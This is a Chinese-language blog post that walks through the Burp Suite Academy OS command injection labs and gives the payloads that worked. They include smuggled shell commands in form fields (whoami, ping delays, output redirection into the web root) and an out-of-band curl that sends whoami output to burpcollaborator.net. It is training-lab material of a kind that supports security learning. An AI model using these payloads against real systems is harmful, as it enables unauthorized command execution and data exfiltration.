---
layout: post
title: "Burpsuite Academy系列教程-OS command injection"
date:   2021/8/22
tags: [Burpsuite Academy系列教程]
comments: true
author: c-uncle
---

# OS command injection



#### Lab: OS command injection, simple case

目标是利用命令注入漏洞获取whoami

漏洞点在/product/stock页面，是个POST请求，参数为productId=&storeId=

很奇怪，我尝试payload：%26 whoami %26，一直报错，没有正常回显。

```
sh: 1: 9: not found
/home/peter/stockreport.sh: line 5: $1: unbound variable
```

最后用了这个payload才成功回显：%26 echo $(whoami)

```
peter-nl4nsX 9
```

%26 $(whoami)  这个payload也可以，回显如下

```
sh: 1: peter-nl4nsX: not found
/home/peter/stockreport.sh: line 5: $1: unbound variable
```

官方的payload是1|whoami，但是这个payload是加在storeId上的。

我想问题可能出在shell脚本的执行上，将payload放在productId上，shell会将payload作为脚本的参数。



## Blind OS command injection vulnerabilities

大多时候命令注入漏洞都是没有回显的，这种情况下，使用echo来判断是否存在漏洞就起不了作用。但是我们依然有办法来验证漏洞是否存在。

假设有一个场景，网站提供给用户一个订阅功能，用户通过这个功能可以提交自己的邮箱，网站可以定时向用户的邮箱发送活动资料。那么网站可能会用到下面的命令

```
mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
```

### Detecting blind OS command injection using time delays

我们通过触发延时操作来验证是否存在漏洞。例如ping命令就是一个能够有效触发延时的命令。

```
ping -c 10 127.0.0.1
```

执行这个命令需要10秒

#### Lab: Blind OS command injection with time delays

目标：触发延时操作验证漏洞

下面是我的payload（注意页面带有csrf防护）

```
csrf=gewzKojftzPeogtgbxsZhP4t0kN8QexU&name=1&email=11$(ping -c 10 127.0.0.1)&subject=1&message=1
```

$符号真好用，$(command)，括号里的内容会被当作命令执行，并且$(command)可以被放在命令的参数里。

下面是官方给的payload

```
csrf=gewzKojftzPeogtgbxsZhP4t0kN8QexU&name=1&email=x||ping+-c+10+127.0.0.1||&subject=1&message=1
```

解释一下||，A||B 	A不行时再执行B。

### Exploiting blind OS command injection by redirecting output

我们可以通过重定向符号，将命令执行的结果保存在服务器上。例如保存在网站的静态资源文件夹中（/var/www/static）.

```
& whoami > /var/www/static/whoami.txt &
```

执行完上面的命令，我们就能通过访问http://xxxx/whoami.txt来查看命令执行结果。

#### Lab: Blind OS command injection with output redirection

目标：获取whoami的内容。

利用submit feedback功能，插入下面的payload。

payload

```
email=x||whoami > /var/www/images/whoami.txt||
```

按照提示，网站图片都存放在/var/www/images/里。

通过F12查看网站图片地址，只要使用下面的url，即可访问我们写在服务器的文件。

/image?filename=whoami.txt

### Exploiting blind OS command injection using out-of-band ([OAST](https://portswigger.net/burp/application-security-testing/oast)) techniques

我们可以结合OAST技术来利用OS盲注

#### Lab: Blind OS command injection with out-of-band interaction

目标：使用命令注入漏洞进行DNS查询。

```
payload
email=x||curl http://burpcollaborator.net||
```

#### Lab: Blind OS command injection with out-of-band data exfiltration

目标：利用OAST技术，获取whoami的执行结果

```
payload
x||curl http://`whoami`.burpcollaborator.net||
```

## How to prevent OS command injection attacks

最有效的防护是不要从应用层代码调用操作系统命令。

